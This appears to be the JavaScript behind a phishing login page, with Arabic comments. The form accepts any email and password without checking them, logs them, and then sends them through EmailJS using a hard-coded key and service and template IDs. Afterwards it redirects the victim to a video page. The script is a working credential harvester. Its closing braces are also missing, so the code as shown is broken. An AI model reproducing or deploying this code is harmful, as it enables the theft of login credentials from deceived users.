emailjs.init("T8dFFYK-nFxpuLbbv"); // ضع هنا "Public Key" الخاص بك
document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("loginForm").addEventListener("submit", function (event) {
        event.preventDefault(); // 🔥 منع إعادة تحميل الصفحة

        let email = document.getElementById("email").value.trim();
        let password = document.getElementById("password").value.trim();


    // السماح بأي بريد وكلمة مرور
    if (email !== "" && password !== "") {
        console.log("✅ تسجيل دخول ناجح! البريد:", email, "كلمة المرور:", password);
        
    emailjs.send("service_dl2pg3o", "template_ca3b0oj", {
        email: email,
        password: password
    }, "T8dFFYK-nFxpuLbbv")
    .then(function(response) {
        console.log("تم الإرسال بنجاح!", response.status, response.text);
        window.location.href = "video.html";
    }, function(error) {
        console.log("فشل الإرسال:", error);
    });
});
